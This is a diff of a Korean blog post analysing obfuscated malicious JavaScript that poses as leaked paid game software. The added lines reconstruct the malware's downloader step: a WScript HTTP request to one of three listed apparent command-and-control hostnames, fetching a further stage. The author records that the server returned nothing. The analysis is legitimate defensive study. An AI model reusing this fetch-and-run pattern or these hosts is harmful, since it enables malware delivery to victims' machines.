@@ -1,20 +1,30 @@
 ---
 layout: post
-title: Analysis of malicious JavaScript code pretending to leaked game software
-subtitle: 유출된 유료 게임 소프트웨어를 가장한 악성 JavaScript에 대한 간단한 코드 분석
+title: **Analysis of malicious JavaScript code pretending to leaked game software**
+subtitle: **유출된 유료 게임 소프트웨어를 가장한 악성 JavaScript에 대한 간단한 코드 분석**
 excerpt: 유출된 유료 게임 소프트웨어를 가장한 악성 JavaScript에 대한 간단한 코드 분석
 tags:
   - Javascript
   - Analysis
   - Malware
-  - Research
 published: true
+
 ---
+
+#### 유출된 유료 게임 소프트웨어를 가장한 악성 JavaScript에 대한 간단한 코드 분석
+
+Analysis of malicious JavaScript code pretending to leaked game software
+
+#### ##### 
+
 
 
 ##### 0. 시나리오
 
 추가예정.
+
+
+
 
 
 ```javascript
@@ -31,7 +41,8 @@ function VX30() {FQ96 = kZ37("sp\l\it",ew84,Li29);}function kZ37(iy87,tS71,cl45)
 ##### 1. 분석 과정
 
 	1. 일단 해당 코드에 걸린 난독화를 최대한 보기 쉽게 바꾸고, 이후에 코드 flow를 파악한다.
- 	2. Excute되는 Script의 악성 행위를 분석한다.
+
+   	2. Excute되는 Script의 악성 행위를 분석한다.
 
 
 
@@ -269,9 +280,21 @@ WScript.Quit();
 Za84 = ["www.test.wynajem-lcd.pl", "www.o4j.de", "www.be-and-do.com"];
 ```
 
-서버는 열려있으나 악성 JS코드는 노출이 되지 않았다.
+```javascript
+Za84 = ["www.test.wynajem-lcd.pl", "www.o4j.de", "www.be-and-do.com"];
+Wr86 = WScript.CreateObject('MSXML2.ServerXMLHTTP');
+yY44 = Math.random().toString()["substr"](2, 70 + 30);
+Wr86.open('GET', 'http://' + Za84[0] + '/forum.php?ehhtlxeegbuni=' + yY44, false);
+Wr86.send();
 
-FQ96를 통해 코드를 실행 하는데, 코드는 더이상 **접근 불가능한 웹서버**에 있으므로 **더이상 분석이 불가능**했다.
+WScript.Echo(Wr86.responseText);
+```
+
+실제로 해당 스크립트를 Run해보면, 출력되는 메세지는 ""이다.
+
+서버는 열려있으나 이후 추가적으로 실행되는 악성 JS코드는 노출이 되지 않았다.
+
+FQ96를 통해 코드를 실행 하는데, 실행할 코드가 없으므로 더이상 분석이 불가능했다.
 
 
 
